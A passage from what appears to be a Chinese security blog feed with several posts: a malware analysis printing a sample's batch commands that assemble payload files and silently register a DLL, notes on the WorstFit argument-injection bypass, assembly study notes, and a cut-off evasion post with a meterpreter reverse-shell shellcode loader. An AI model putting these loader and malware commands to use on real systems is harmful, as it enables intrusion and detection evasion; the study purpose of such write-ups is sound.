表示拷贝一个二进制文件</span><br><span class="line"># copy在合并多个文件时使用连接符+，本条命令中，连接header和shell32后，重命名为（例如）360.3</span><br><span class="line">!call copy /Y /b C:\Users\Public\Update\header+C:\Users\Public\Update\shell32 C:\Users\Public\Update\360.%TIME:~4,1% &gt;nul</span><br><span class="line"></span><br><span class="line"># 合并header和WindowsSecurity.doc，并重命名为（例如）4.exe</span><br><span class="line">!call copy /Y /b C:\Users\Public\Update\header+_\_\_\_\_\_\_\_\_rels\WindowsSecurity.doc C:\Users\Public\Update\%TIME:~3,1%.exe &gt;nul</span><br><span class="line"></span><br><span class="line"># 因为没有完整的样本，猜测病毒作者前面已经将%TIME%复制给一个变量，否则每次调用%TIME:~3,1%取的值是变动的</span><br><span class="line"># 调用4.exe -InstallLsp 360.3</span><br><span class="line">!call start C:\Users\Public\Update\%TIME:~3,1%.exe -InstallLsp C:\Users\Public\Update\360.%TIME:~4,1% &gt;nul</span><br><span class="line"></span><br><span class="line"># 如果不存在WinVer.dll的话，将header.doc和WinVer.doc合并后重命名为WinVer.dll</span><br><span class="line"># regsvr32通常用来注册dll，注册后系统可以使用dll中的函数，这里用regsvr32静默注册WinVer.dll，静默的意思是成功或失败都没有提示</span><br><span class="line">!IF NOT EXIST C:\Users\Public\WinVer.dll (copy /Y /b _\_\_\_\_\_\_\_\_rels\header.doc+_\_\_\_\_\_\_\_\_rels\WinVer.doc C:\Users\Public\WinVer.dll &amp;&amp; regsvr32 /s C:\Users\Public\WinVer.dll)</span><br><span class="line"></span><br><span class="line"># ftp下的退出命令</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p>AI查询下-InstallLsp，一般是Windows下第三方开发的流量类工具会用到此参数，猜测利用白加黑技术，4.exe是白exe，360.3是黑dll，后续就是常规的解密shellcode、执行shellcode，可以在x64dbg中对常见危险函数下断点，然后dump内存，由于没有样本无法进行进一步分析</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;01-引言&quot;&gt;&lt;a href=&quot;#01-引言&quot; class=&quot;headerlink&quot; title=&quot;01 引言&quot;&gt;&lt;/a&gt;01 引言&lt;/h1&gt;&lt;p&gt;吾爱上看到一篇病毒分析文章，初步看了一眼像是FTP执行LNK的方式，早在2022年甚至更早就公开的技术了，好像24年</summary>
      
    
    
    
    <category term="病毒分析" scheme="http://example.com/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    
    <category term="病毒分析" scheme="http://example.com/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="LNK钓鱼" scheme="http://example.com/tags/LNK%E9%92%93%E9%B1%BC/"/>
    
  </entry>
  
  <entry>
    <title>“WorstFit”学习</title>
    <link href="http://example.com/2025/08/14/%E2%80%9CWorstFit%E2%80%9D%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2025/08/14/%E2%80%9CWorstFit%E2%80%9D%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-08-14T13:56:08.000Z</published>
    <updated>2025-08-14T14:03:08.773Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>翻推特时看到Orange的一篇文章：“WorstFit: Unveiling Hidden Transformers in Windows ANSI!”，被标题吸引点进去看看，仔细研读后发现，文章展现了一个新的攻击面，漏洞很精彩。<br>由于时间有限这里只做一个简单的学习笔记。文中甚至揭露了ElFinder在Windows下的一个后台RCE 0day（ElFinder是一款开源的基于PHP的Web文件管理系统）</p><p>原文链接：<a href="https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/">https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/</a></p><h1 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h1><h2 id="知识点1"><a href="#知识点1" class="headerlink" title="知识点1"></a>知识点1</h2><p>Windows最初用的字符集是ANSI，后来扩展到Unicode字符集，但Windows承诺永远向后兼容，所以现在仍然兼容ANSI字符集。兼容ANSI字符集的方式是，内部有一个API RtlUnicodeStringToAnsiString（或者WideCharToMultiByte）将Unicode字符转换为ANSI字符。我们都知道，Windows下的GetCurrentDirectoryA()使用ANSI字符集，GetCurrentDirectoryW()使用Unicode字符集，也就是说，当传入Unicode字符，并且调用ANSI API时，会在内部调用RtlUnicodeStringToAnsiString（或者WideCharToMultiByte）</p><h2 id="知识点2"><a href="#知识点2" class="headerlink" title="知识点2"></a>知识点2</h2><p>我们常用的C语言写法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(int argc, char* argv[], char* envp[]) &#123;</span><br><span class="line">    for (int i = 0; i &lt; argc; ++i)</span><br><span class="line">        printf(&quot;argv[%d] = %s\n&quot;, i, argv[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在编译时会秘密生成函数mainCRTStartup，而mainCRTStartup内部会调用GetCommandLineA，也就是说，当输入是Unicode字符集时，凡是这样写的程序，都有上述漏洞，现今的输入基本都是Unicode字符，这样的话，影响面就很大了，其中包括著名的curl、openssl等</p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>目前为止都没有问题，可是当代一些新奇的字符如 emojis ✅, áccènted letters, 𝒻𝒶𝓃𝒸𝓎 𝕤𝕪𝕞𝕓𝕠𝕝𝕤 and CJK 匚卄八尺八匚ㄒヨ尺丂 等在转换为ANSI时会产生意想不到的结果，具体而言是，看起来像双引号的U+ff02会被转换为双引号0x0022，也就是说php中的escapeshellarg并不是完全可靠，有了WorstFit，在Windows下是可以绕过的，也就造成了上面说的ElFinder在Windows下的一个后台RCE 0day。这个漏洞看完就感觉很奇妙，具体细节可以去看原文，确实产生了一个新的攻击面。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;翻推特时看到Orange的一篇文章：“WorstFit: Unveiling Hidden Transformers in Windows </summary>
      
    
    
    
    <category term="漏洞研究" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
    <category term="Windows" scheme="http://example.com/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Windows下32位汇编学习</title>
    <link href="http://example.com/2025/08/14/Windows%E4%B8%8B32%E4%BD%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2025/08/14/Windows%E4%B8%8B32%E4%BD%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-08-14T13:33:37.000Z</published>
    <updated>2025-08-14T14:26:31.001Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>DOS下16位汇编学的时候完全就是硬啃，因为和现在用到的知识几乎不沾边，Windows下32位汇编开始涉及我们用到的知识，学起来还有点动力，本篇博客简单记录下Windows下32位汇编的学习总结</p><p>我用的罗云彬老师那本“Windows环境下32位汇编语言程序设计（第二版）”，电子版位于：<a href="https://github.com/ybdt/evasion-hub/tree/master/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90">https://github.com/ybdt/evasion-hub/tree/master/学习资源</a></p><h1 id="0x02-基本概念"><a href="#0x02-基本概念" class="headerlink" title="0x02 基本概念"></a>0x02 基本概念</h1><h2 id="CPU工作模式"><a href="#CPU工作模式" class="headerlink" title="CPU工作模式"></a>CPU工作模式</h2><p>从DOS下16位汇编到Windows下32位汇编，CPU的工作模式也从实模式变为保护模式（其实还有实模式和虚拟86模式，但本篇博客意在总结只挑重点说），这时CPU里的寄存器已经从16位变为32位，寻址空间也从之前的1MB变为4GB，并且多了两个东西，一个是内存分页机制，一个是优先级，内存分页机制可以为虚拟内存提供良好支持，后面内存管理中会提到，优先级包含4个级别，0-3级，0级就是常说的内核层ring0级，3级就是应用程序层ring3级，由于历史原因，Windows操作系统不使用1级和2级</p><h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><p>保护模式下Windows的内存管理和实模式下DOS的内存管理有很大不同，DOS下内存管理通过两个16位的寄存器得到一个20位地址，也就是最终的物理地址，而在保护模式下，首先，寄存器变为32位，2的32次幂=4GB，也就是说单个寄存器即可寻址4GB，不再需要之前（段地址:偏移地址）的形式，其次，由于内存分页机制，内存被分为一个个4KB大小的页，这些物理上不相邻的4KB大小的页通过一个叫“页表”的映射器，映射为虚拟地址，供操作系统和应用程序使用，人们常说的应用程序可以使用4GB，其实是因为CPU是一个分时处理器，例如，在0.001-0.002这个时间段，全部的4GB内存属于程序A，在0.002-0.003这个时间段，全部的4GB内存属于程序B，在0.003-0.004这个时间段，全部的4GB内存属主又切换回程序A，大概就是这个意思，从物理上看，实际的一块内存地址，可能上一秒属于程序A，下一秒属于程序B，从逻辑上看，一块内存地址，一直属于程序A</p><h2 id="中断和异常"><a href="#中断和异常" class="headerlink" title="中断和异常"></a>中断和异常</h2><p>中断指当程序执行过程中有更重要的事情需要实时处理，通过中断控制器通知CPU，CPU保存好当前程序的地址后，转到中断处理程序，处理完后再通过保存的地址回来，异常指遇到指令异常、除法除0、权限异常等问题，转到异常处理程序，处理过程和中断处理程序一样，DOS下的中断和异常可以由用户控制，但是Windows下的中断和异常则有严格的限制，因为异常/中断处理程序的优先级比较高（优先级不高也没法优先进入中断），通过一个叫“门”的概念控制如何调用中断/异常处理程序</p><h1 id="0x03-代码演示"><a href="#0x03-代码演示" class="headerlink" title="0x03 代码演示"></a>0x03 代码演示</h1><p>Win32下汇编相比C语言不同的是，为语句找到他们该去的地方，比如代码段，数据段，堆栈段等，下面看一个反汇编例子<br>C语言代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">// 简单的函数，接受两个参数并返回它们的和</span><br><span class="line">int add(int a, int b) &#123;</span><br><span class="line">    int result;       // 局部变量</span><br><span class="line">    result = a + b;   // 执行加法运算</span><br><span class="line">    return result;    // 返回结果</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    int x = 5;        // 第一个局部变量</span><br><span class="line">    int y = 3;        // 第二个局部变量</span><br><span class="line">    int sum;          // 用于存储结果的局部变量</span><br><span class="line">    </span><br><span class="line">    sum = add(x, y);  // 调用add函数</span><br><span class="line">    </span><br><span class="line">    printf(&quot;Sum: %d\n&quot;, sum);  // 打印结果</span><br><span class="line">    return 0;         // 程序结束</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码的反汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">; main函数部分</span><br><span class="line">main:</span><br><span class="line">    push    ebp         ; 保存旧的基址指针到堆栈</span><br><span class="line">    mov     ebp, esp    ; 设置新的基址指针，指向当前栈顶</span><br><span class="line">    sub     esp, 16     ; 在栈上分配16字节空间给局部变量</span><br><span class="line">    </span><br><span class="line">    ; 初始化局部变量x = 5</span><br><span class="line">    mov     DWORD PTR [ebp-4], 5</span><br><span class="line">    </span><br><span class="line">    ; 初始化局部变量y = 3</span><br><span class="line">    mov     DWORD PTR [ebp-8], 3</span><br><span class="line">    </span><br><span class="line">    ; 准备调用add函数，先将参数压栈</span><br><span class="line">    mov     eax, DWORD PTR [ebp-8]  ; 获取y的值</span><br><span class="line">    push    eax                     ; 将y压栈（第二个参数）</span><br><span class="line">    mov     eax, DWORD PTR [ebp-4]  ; 获取x的值</span><br><span class="line">    push    eax                     ; 将x压栈（第一个参数）</span><br><span class="line">    </span><br><span class="line">    call    add                     ; 调用add函数，会将返回地址压栈</span><br><span class="line">    add     esp, 8                  ; 清理栈上的函数参数</span><br><span class="line">    </span><br><span class="line">    ; 将add函数的返回值保存到sum变量</span><br><span class="line">    mov     DWORD PTR [ebp-12], eax</span><br><span class="line">    </span><br><span class="line">    ; 准备调用printf函数</span><br><span class="line">    mov     eax, DWORD PTR [ebp-12]</span><br><span class="line">    push    eax                     ; 将sum作为参数压栈</span><br><span class="line">    push    OFFSET FLAT:.LC0        ; 将格式化字符串地址压栈</span><br><span class="line">    call    printf                  ; 调用printf</span><br><span class="line">    add     esp, 8                  ; 清理栈上的参数</span><br><span class="line">    </span><br><span class="line">    ; 函数返回</span><br><span class="line">    mov     eax, 0                  ; 返回值0</span><br><span class="line">    leave                           ; 相当于mov esp, ebp; pop ebp</span><br><span class="line">    ret                             ; 返回</span><br><span class="line"></span><br><span class="line">; add函数部分</span><br><span class="line">add:</span><br><span class="line">    push    ebp         ; 保存main函数的基址指针</span><br><span class="line">    mov     ebp, esp    ; 设置当前函数的基址指针</span><br><span class="line">    sub     esp, 16     ; 为局部变量分配空间</span><br><span class="line">    </span><br><span class="line">    ; 计算a + b，并保存到result</span><br><span class="line">    mov     eax, DWORD PTR [ebp+8]  ; 获取第一个参数a</span><br><span class="line">    add     eax, DWORD PTR [ebp+12] ; 加上第二个参数b</span><br><span class="line">    mov     DWORD PTR [ebp-4], eax  ; 保存结果到result</span><br><span class="line">    </span><br><span class="line">    ; 返回结果</span><br><span class="line">    mov     eax, DWORD PTR [ebp-4]  ; 将result放入eax寄存器作为返回值</span><br><span class="line">    leave                           ; 清理堆栈</span><br><span class="line">    ret                             ; 返回，弹出返回地址</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>反汇编代码解读：<br>1、首先是常规的EBP入栈，用于保存上一个栈基址指针<br>2、然后将栈顶指针（ESP）的值赋给栈基址指针（EBP）<br>3、栈向下延伸16字节<br>4、接下来该调用函数add了，此时EBP-4是第一个局部变量x的地址，EBP-8是第二个局部变量y的地址，由于C/C++遵循的调用标准是cdecl，也就是参数入栈时是从右向左，所以先将局部变量y入栈，再将局部变量x入栈<br>5、程序准备进入函数add的栈帧，进入之前会先把返回地址压入栈<br>6、进入函数add的栈帧后，同样是EBP、ESP那一套<br>7、此时以当前栈帧的EBP为基址，变量x和变量y的地址就应该是EBP+8和EBP+12，计算完后弹出返回地址，继续执行函数add后面的指令</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h1&gt;&lt;p&gt;DOS下16位汇编学的时候完全就是硬啃，因为和现在用到的知识几乎不沾边，Windows下32位汇编开</summary>
      
    
    
    
    <category term="汇编语言" scheme="http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="Windows" scheme="http://example.com/tags/Windows/"/>
    
    <category term="32位汇编" scheme="http://example.com/tags/32%E4%BD%8D%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>DOS下16位汇编学习</title>
    <link href="http://example.com/2025/08/05/DOS%E4%B8%8B16%E4%BD%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2025/08/05/DOS%E4%B8%8B16%E4%BD%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-08-05T08:09:22.000Z</published>
    <updated>2025-08-14T13:39:07.689Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>汇编语言不学总感觉差点东西，那就开整，我用的是王爽老师那本汇编语言第三版，也可以看B站上“零点Boy”老师的视频课程，参考的也是王爽老师那本汇编语言讲的</p><p>电子版：<a href="https://github.com/ybdt/evasion-hub/blob/master/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%88%E7%AC%AC3%E7%89%88%EF%BC%89%E7%8E%8B%E7%88%BD%E8%91%97.pdf">这里</a></p><p>本文只是简单记录下这段时间的学习感受</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>汇编语言是和操作系统强相关的低级语言，DOS下16位汇编、Windows下32位汇编、Linux下汇编可以说是“三门语言”，不像C、C++、JAVA这种高级语言，是跨平台的。王爽老师那本汇编语言讲的就是DOS下16位汇编，现在到处都是64的Windows，16位的DOS汇编属实有点过时了，但是知识都是一点点演化的，想了解汇编是怎么来的，这本书的基础部分我觉得还是有用的</p><p>16位DOS汇编寄存器是16位的，但寻址总线是20位的，所以CPU内部会有一个转换器，转换器的基本逻辑是，将两个16位寄存器（也就是两个16位二进制）经过转换变成一个20位二进制，寻址方式是   段地址:偏移地址</p><p>汇编代码之所以看起来像天书，就是因为它有很多隐藏知识，例如下述代码，ds寄存器默认被用来存放段地址，再结合偏移地址，便得到了某个字符串的起始地址，然后对字符串进行异或操作，便可以将大写变为小写，将小写变为大写（注意：32位CPU的通用寄存器变为：EAX、EBX、ECX、EDX，64位CPU的通用寄存器变为：RAX、RBX、RCX、RDX）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code, ds:data</span><br><span class="line">data segment</span><br><span class="line">db &quot;BASIC&quot;</span><br><span class="line">db &quot;minix&quot;</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start: mov ax, data</span><br><span class="line"> mov ds, ax</span><br><span class="line"> </span><br><span class="line"> mov bx, 0</span><br><span class="line"> mov cx, 5</span><br><span class="line">s1:mov al, [bx]</span><br><span class="line">   and al, 11011111b ; convert to upper-case</span><br><span class="line">   mov [bx], al</span><br><span class="line">   inc bx</span><br><span class="line">   loop s1</span><br><span class="line">   </span><br><span class="line">   mov bx, 5</span><br><span class="line">   mov cx, 5</span><br><span class="line">s2:mov al, [bx]</span><br><span class="line">   or al, 00100000b ; convert to lower-case</span><br><span class="line">   mov [bx], al</span><br><span class="line">   inc bx</span><br><span class="line">   loop s2</span><br><span class="line">   </span><br><span class="line">   mov ax, 4c000h</span><br><span class="line">   int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p><img src="/2025/08/05/DOS%E4%B8%8B16%E4%BD%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/01.png" alt="01"></p><p>16位DOS汇编中用到的主要寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">AX：通用寄存器，通常用于存放程序运行过程中产生的临时值，可以简易理解为C语言中的变量</span><br><span class="line"></span><br><span class="line">BX：通用寄存器，除了存放临时值，常结合SI、DI存放内存地址</span><br><span class="line"></span><br><span class="line">CX：通用寄存器，除了存放临时值，还用作循环计数器</span><br><span class="line"></span><br><span class="line">DX：通用寄存器，通常用于存放程序运行过程中产生的临时值，可以简易理解为C语言中的变量</span><br><span class="line"></span><br><span class="line">CS：Code Segment，代码段寄存器，里面存放要执行的指令的段地址</span><br><span class="line"></span><br><span class="line">IP：Instruction Pointer，指令指针寄存器，里面存放要执行指令的偏移地址</span><br><span class="line"></span><br><span class="line">DS：Data Segment，数据段寄存器，里面存放要访问的数据的段地址</span><br><span class="line"></span><br><span class="line">SS：Stack Segment，栈段寄存器，里面存放栈的段地址</span><br><span class="line"></span><br><span class="line">SP：Stack Pointer，栈指针寄存器，里面存放栈的偏移地址</span><br><span class="line"></span><br><span class="line">ES：Extra Segment，附加段寄存器</span><br><span class="line"></span><br><span class="line">SI：Source Index，源变址寄存器，里面存放可变的内存地址</span><br><span class="line"></span><br><span class="line">DI：Destination Index，目的变址寄存器，里面存放可变的内存地址</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;汇编语言不学总感觉差点东西，那就开整，我用的是王爽老师那本汇编语言第三版，也可以看B站上“零点Boy”老师的视频课程，参考的也是王爽老师那本</summary>
      
    
    
    
    <category term="汇编语言" scheme="http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="DOS" scheme="http://example.com/tags/DOS/"/>
    
    <category term="16位汇编" scheme="http://example.com/tags/16%E4%BD%8D%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>利用NtReadVirtualMemory实现IAT中规避高危API</title>
    <link href="http://example.com/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/"/>
    <id>http://example.com/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/</id>
    <published>2025-07-28T13:59:40.000Z</published>
    <updated>2025-07-31T00:48:56.635Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前世"><a href="#前世" class="headerlink" title="前世"></a>前世</h1><h2 id="Win32-API"><a href="#Win32-API" class="headerlink" title="Win32 API"></a>Win32 API</h2><p>Win32 API实现最简单的Shellcode Loader如下，代码中包含注释，可以看到每条语句的含义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">// msfvenom -p windows/meterpreter/reverse_https lhost=xxx lport=xxx -f c</span><br><span class="line">unsigned char shellcode[] =</span><br><span class="line">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52&quot;</span><br><span class="line">...</span><br><span class="line">&quot;\x30\x2e\x32\x00\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    // 分配内存</span><br><span class="line">    LPVOID allocatedMemory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    if (allocatedMemory == NULL) &#123;</span><br><span class="line">        printf(&quot;[-] VirtualAlloc failed. Error: %d\n&quot;, GetLastError());</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 拷贝内存</span><br><span class="line">    CopyMemory(allocatedMemory, shellcode, sizeof(shellcode));</span><br><span class="line"></span><br><span class="line">    // 修改内存属性</span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    if (!VirtualProtect(allocatedMemory, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &amp;oldProtect)) &#123;</span><br><span class="line">        printf(&quot;[-] VirtualProtect failed. Error: %d\n&quot;, GetLastError());</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 创建线程执行</span><br><span class="line">    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, NULL, 0, NULL);</span><br><span class="line">    if (hThread == NULL) &#123;</span><br><span class="line">        printf(&quot;[-] CreateThread failed. Error: %d\n&quot;, GetLastError());</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 等待线程完成</span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码编译执行后，Meterpreter可成功收到反连，如下图<br><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/01.png" alt="image">  </p><p>通过<a href="https://github.com/hasherezade/pe-bear">PE-bear</a>查看，可以看到IAT中存在之前用到的几个Win32 API，如下图<br><img src="/2025/07/28/%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/02.png" alt="image">  </p><h2 id="LoadLibrary、GetProcAddress"><a href="#LoadLibrary、GetProcAddress" class="headerlink" title="LoadLibrary、GetProcAddress"></a>LoadLibrary、GetProcAddress</h2><p>然后进化出通过LoadLibrary、GetProcAddress实现的动态API调用，代码中包含注释，可以看到每条语句的含义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 